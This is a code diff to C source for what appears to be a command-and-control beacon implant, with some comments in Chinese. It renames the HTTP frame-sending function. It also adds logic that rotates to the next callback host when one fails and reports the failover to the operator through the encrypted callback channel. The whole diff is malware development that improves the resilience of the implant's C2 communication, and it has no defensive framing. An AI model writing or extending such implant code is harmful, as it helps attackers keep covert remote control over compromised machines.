@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <string.h>
 #include "channel.h"
 #include "commands.h"
 #include "security.h"
@@ -71,7 +72,9 @@ void command_shell_post(char * buffer, int length, int type, BOOL sendNow) {
 	free(cipherdata);
 }
 
-void command_shell_callback(char * buffer, int length, int type) {
+/* the HTTP beacon's frame sender; command_shell_callback (callback.cpp)
+ * tags the frame first */
+void command_shell_send(char * buffer, int length, int type) {
 	BOOL   shouldChunk = setting_int(SETTING_C2_CHUNK_POST) > 0;
 
 	/* 与分块阈值比较，如果需要则进行分块（仅限HTTP POST！） */
@@ -208,8 +211,16 @@ void beacon(LPVOID lpReserved) {
 		/* 4.10 beacon_config host 热换：覆盖层接管后每周期从这里取
 		 * host/uri（round-robin 跳 held）；未接管时走烘焙 strategy 路径 */
 		if (!hostcfg_pick(beacon_domain, 128, url, 256)) {
+			char prev_host[128];
+			_snprintf(prev_host, 128, "%s", beacon_domain);
 			_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
 			_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
+			/* 4.13: the move to the next callback host is reported */
+			if (failedHost && prev_host[0] != 0 && strcmp(prev_host, beacon_domain) != 0) {
+				char note[300];
+				_snprintf(note, 300, "callback host %s failed, failing over to %s", prev_host, beacon_domain);
+				command_shell_callback(note, (int)strlen(note), CALLBACK_HOST_FAILOVER);
+			}
 		}
 		failedHost = FALSE;
 
